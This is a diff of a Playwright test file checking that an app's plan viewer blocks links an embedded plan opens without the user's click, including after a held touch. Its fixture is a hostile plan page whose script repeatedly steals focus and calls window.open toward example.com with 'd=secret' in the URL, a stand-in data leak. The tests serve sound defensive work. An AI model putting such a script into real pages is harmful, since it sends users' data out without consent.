@@ -150,48 +150,50 @@ test("a link in a plan, or in its <ia-html>, opens in a new tab after the user's
   });
 });
 
-// The desktop app (Electron) has no popup blocker: a popup the frame opened as it loaded went straight to the browser,
-// with whatever the page put in its URL.
-test("a plan can't open a link without the user's click in it: the board asks instead, also after the frame takes the focus", async () => {
-  await withBrowser(server, { allowErrors: [/allow-popups/] }, async (ui) => {
-    const { page } = ui;
-    const opened = [];
-    page.context().on("page", (p) => opened.push(p.url()));
-    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
-    // What the board sees, as it happens: each link the frame asks it to open (and whether the board had the user's
-    // activation then), each window.open of its own, and the user's last pointer down in it.
-    await page.addInitScript(() => {
-      if (window !== top) return;
-      const seen = (window.iaCheck = { asks: [], opens: [], input: -Infinity });
-      addEventListener("message", (e) => {
-        if (typeof e.data?.iaOpen === "string") seen.asks.push({ at: performance.now(), active: navigator.userActivation.isActive });
-      });
-      const open = window.open;
-      window.open = function (url, ...rest) {
-        seen.opens.push({ url: String(url), at: performance.now() });
-        return open.call(this, url, ...rest);
-      };
-      addEventListener("pointerdown", (e) => e.isTrusted && (seen.input = performance.now()), true);
+/**
+ * Opens a plan that asks the board to open links (and tries to open them itself) as it loads, then keeps taking the
+ * focus and asking every 200ms, and waits until the board's activation from Playwright's queries has run out and the
+ * frame has asked a few times with the focus. `peek` and `until` read the board without a user gesture.
+ */
+async function leakyPlan(ui) {
+  const { page } = ui;
+  const opened = [];
+  page.context().on("page", (p) => opened.push(p.url()));
+  await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
+  // What the board sees, as it happens: each link the frame asks it to open (and whether the board had the user's
+  // activation then), each window.open of its own, and the user's last pointer down in it.
+  await page.addInitScript(() => {
+    if (window !== top) return;
+    const seen = (window.iaCheck = { asks: [], opens: [], input: -Infinity });
+    addEventListener("message", (e) => {
+      if (typeof e.data?.iaOpen === "string") seen.asks.push({ at: performance.now(), active: navigator.userActivation.isActive });
     });
-    // Playwright's queries (evaluate, locators, waitFor) run as a user gesture, which activates the board without any
-    // input in it, so while the frame has the focus they'd let its next ask open (HA-272). Reads in the board until the
-    // user's input in it go through CDP instead, which doesn't.
-    const cdp = await page.context().newCDPSession(page);
-    const peek = async (expression) => {
-      const { result, exceptionDetails } = await cdp.send("Runtime.evaluate", { expression, returnByValue: true });
-      if (exceptionDetails) throw new Error(`${expression}: ${exceptionDetails.exception?.description ?? exceptionDetails.text}`);
-      return result.value;
+    const open = window.open;
+    window.open = function (url, ...rest) {
+      seen.opens.push({ url: String(url), at: performance.now() });
+      return open.call(this, url, ...rest);
     };
-    const until = async (expression, what) => {
-      const deadline = Date.now() + 20000;
-      for (;;) {
-        const value = await peek(expression);
-        if (value) return value;
-        if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}: ${JSON.stringify(await peek("iaCheck"))}`);
-        await page.waitForTimeout(100);
-      }
-    };
-    const content = `<h1>Leaky</h1><a id="blank" href="https://example.com/blank?d=secret" target="_blank">blank</a><input id="steal">
+    addEventListener("pointerdown", (e) => e.isTrusted && (seen.input = performance.now()), true);
+  });
+  // Playwright's queries (evaluate, locators, waitFor) run as a user gesture, which activates the board without any
+  // input in it, so while the frame has the focus they'd let its next ask open (HA-272). Reads in the board until the
+  // user's input in it go through CDP instead, which doesn't.
+  const cdp = await page.context().newCDPSession(page);
+  const peek = async (expression) => {
+    const { result, exceptionDetails } = await cdp.send("Runtime.evaluate", { expression, returnByValue: true });
+    if (exceptionDetails) throw new Error(`${expression}: ${exceptionDetails.exception?.description ?? exceptionDetails.text}`);
+    return result.value;
+  };
+  const until = async (expression, what) => {
+    const deadline = Date.now() + 20000;
+    for (;;) {
+      const value = await peek(expression);
+      if (value) return value;
+      if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}: ${JSON.stringify(await peek("iaCheck"))}`);
+      await page.waitForTimeout(100);
+    }
+  };
+  const content = `<h1>Leaky</h1><a id="blank" href="https://example.com/blank?d=secret" target="_blank">blank</a><input id="steal">
 <script>
   // The browser's window.open (the board's comes after the page's scripts), and a fresh frame's, as it loads.
   window.open("https://example.com/load?d=secret");
@@ -204,36 +206,46 @@ test("a plan can't open a link without the user's click in it: the board asks in
   // Then it keeps taking the focus and asking the board.
   setInterval(() => { window.focus(); document.getElementById("steal").focus(); window.open("https://example.com/later?d=secret"); }, 200);
 </script>`;
-    const at = new Date().toISOString();
-    await page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
-      route.fulfill({
-        json: {
-          task_type: "plan",
-          file: "plan.html",
-          versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
-          version: 1,
-          content,
-        },
-      }),
-    );
-    await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
-    // Let the activation from the queries above run out, untouched (the frame's asks until then may open), and the
-    // frame take the focus.
-    const quiet = await until("!navigator.userActivation.isActive && performance.now()", "the board's activation to run out");
-    await until(`iaCheck.asks.filter((a) => a.at > ${quiet}).length >= 3 && document.activeElement?.tagName === "IFRAME"`, "the frame's asks");
-    assert.deepEqual(
-      opened.filter((u) => !u.includes("/later")),
-      [],
-      "the frame opened nothing itself",
-    );
-    assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "the board opened nothing without the user's input");
-    assert.equal(await peek(`document.body.innerText.includes("opens a link")`), false, "nor asked");
+  const at = new Date().toISOString();
+  await page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
+    route.fulfill({
+      json: {
+        task_type: "plan",
+        file: "plan.html",
+        versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
+        version: 1,
+        content,
+      },
+    }),
+  );
+  await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
+  // Let the activation from the queries above run out, untouched (the frame's asks until then may open), and the
+  // frame take the focus.
+  const quiet = await until("!navigator.userActivation.isActive && performance.now()", "the board's activation to run out");
+  await until(`iaCheck.asks.filter((a) => a.at > ${quiet}).length >= 3 && document.activeElement?.tagName === "IFRAME"`, "the frame's asks");
+  assert.deepEqual(
+    opened.filter((u) => !u.includes("/later")),
+    [],
+    "the frame opened nothing itself",
+  );
+  assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "the board opened nothing without the user's input");
+  assert.equal(await peek(`document.body.innerText.includes("opens a link")`), false, "nor asked");
+  // The middle of the plan's composer, in the board.
+  const composer = await peek(`(() => {
+    const r = document.querySelector('[placeholder="Ask for changes to the plan…"]').getBoundingClientRect();
+    return { x: r.x + r.width / 2, y: r.y + r.height / 2 };
+  })()`);
+  return { opened, quiet, peek, until, cdp, composer };
+}
+
+// The desktop app (Electron) has no popup blocker: a popup the frame opened as it loaded went straight to the browser,
+// with whatever the page put in its URL.
+test("a plan can't open a link without the user's click in it: the board asks instead, also after the frame takes the focus", async () => {
+  await withBrowser(server, { allowErrors: [/allow-popups/] }, async (ui) => {
+    const { page } = ui;
+    const { opened, quiet, peek, until, composer } = await leakyPlan(ui);
     // The user clicks the composer and types: the frame takes the focus back, while the board has the user's activation.
-    const { x, y } = await peek(`(() => {
-      const r = document.querySelector('[placeholder="Ask for changes to the plan…"]').getBoundingClientRect();
-      return { x: r.x + r.width / 2, y: r.y + r.height / 2 };
-    })()`);
-    await page.mouse.click(x, y);
+    await page.mouse.click(composer.x, composer.y);
     await page.keyboard.type("hello");
     const input = await peek("iaCheck.input");
     assert.ok(input > quiet, "the click reached the board");
@@ -245,6 +257,33 @@ test("a plan can't open a link without the user's click in it: the board asks in
     await until(`document.body.innerText.includes("opens a link")`, "the board to ask");
     assert.equal(await peek(`document.querySelector("[role=alert] code")?.innerText`), "https://example.com/later?d=secret");
     assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), []);
+    assert.deepEqual(
+      opened.filter((u) => !u.includes("/later")),
+      [],
+    );
+  });
+});
+
+// A touch (or pen) activates the page as it's lifted, not as it comes down: a touch held on the board gave an activation
+// that outlasted the board's 5.5s from its pointer down, so the frame's asks then opened at once (HA-274).
+test("a touch held on the board doesn't let a plan open a link once the board's activation outlasts the touch's start", async () => {
+  await withBrowser(server, { touch: true, allowErrors: [/allow-popups/] }, async (ui) => {
+    const { page } = ui;
+    const { opened, quiet, peek, until, cdp, composer } = await leakyPlan(ui);
+    // A touch held for 3s on the composer.
+    const point = [{ x: composer.x, y: composer.y }];
+    await cdp.send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: point, timestamp: Date.now() / 1000 });
+    await page.waitForTimeout(3000);
+    await cdp.send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [], timestamp: Date.now() / 1000 });
+    const input = await peek("iaCheck.input");
+    assert.ok(input > quiet, "the touch reached the board");
+    // Its activation, from its end, runs out (well after 5.5s from its start).
+    const active = `iaCheck.asks.filter((a) => a.at > ${input} && a.active)`;
+    await until(`${active}.length && iaCheck.asks.some((a) => a.at > ${active}.at(-1).at && !a.active)`, "the touch's activation to run out");
+    assert.ok(await peek(`${active}.some((a) => a.at > ${input} + 5500)`), "the frame asked late in the touch's activation");
+    assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "nothing opened after the touch on the board");
+    assert.equal(await peek("document.activeElement?.tagName"), "IFRAME", "the frame took the focus");
+    await until(`document.body.innerText.includes("opens a link")`, "the board to ask");
     assert.deepEqual(
       opened.filter((u) => !u.includes("/later")),
       [],
